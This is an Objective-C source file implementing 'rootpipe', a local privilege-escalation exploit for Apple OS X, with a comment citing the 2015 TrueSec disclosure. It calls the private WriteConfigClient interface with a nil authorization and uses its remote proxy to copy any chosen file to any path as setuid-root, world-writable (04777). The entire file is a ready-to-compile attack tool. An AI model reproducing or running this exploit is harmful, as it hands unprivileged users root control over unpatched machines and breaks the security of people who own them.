#import <Foundation/Foundation.h>
#import <SecurityFoundation/SFAuthorization.h>


#pragma mark -

@interface UserUtilities : NSObject

- (void)createFileWithContents:(NSData *)data path:(NSString *)path attributes:(NSDictionary *)attributes;

@end


@interface WriteConfigClient : NSObject

@property (readonly) UserUtilities *remoteProxy;

+ (id)sharedClient;
- (BOOL)authenticateUsingAuthorizationSync:(SFAuthorization *)authorization;

@end


#pragma mark -

int main(int argc, const char *argv[])
{
	if (argc != 3)
	{
		fprintf(stderr, "Usage: rootpipe source target\n");
		
		return EXIT_FAILURE;
	}
	
	NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
	
	BOOL isDir;
	
	if (![[NSFileManager defaultManager] fileExistsAtPath:@(argv[1]) isDirectory:&isDir] || isDir)
	{
		fprintf(stderr, "Invalid source.\n");
		
		return EXIT_FAILURE;
	}
	
	
	// https://truesecdev.wordpress.com/2015/04/09/hidden-backdoor-api-to-root-privileges-in-apple-os-x/
	
	WriteConfigClient *client = [WriteConfigClient sharedClient];
	
	[client authenticateUsingAuthorizationSync:nil];
	
	UserUtilities *tool = [client remoteProxy];
	
	[tool createFileWithContents:[NSData dataWithContentsOfFile:@(argv[1])] path:@(argv[2]) attributes:@{ NSFilePosixPermissions: @04777 }];
	
	
	[pool drain];
	
	return EXIT_SUCCESS;
}
